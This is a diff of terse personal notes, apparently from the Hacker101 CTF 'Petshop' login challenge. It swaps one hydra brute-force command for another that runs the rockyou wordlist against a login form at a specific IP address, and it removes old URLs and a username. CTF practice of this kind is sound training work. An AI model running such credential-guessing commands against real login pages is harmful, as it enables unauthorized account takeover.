@@ -26,16 +26,8 @@ inject code into click responses...
 
 ### Login page...password cracking
 
-hydra -L rockyou.txt -p aaa 35.xxx.xxx.xxx http-post-form "/73fxxxxxxx/login:username=^USER^&password=^PASS^:Incorrect password
-
 rockyoulist.txt
 
+hydra -vV -t 16 -S -L rockyou.txt -p "idk" 34.208.128.127 http-post-form "/479d9e89892c5b613157afcade304547/login:username=^USER^&password=^PASS^:Invalid username"
 
-https://d9ff4654a118817ed567402b105f1231.ctf.hacker101.com/login
-
-https://d9ff4654a118817ed567402b105f1231.ctf.hacker101.com/login
-
-
-username=petshop
-password
-
+SWEET
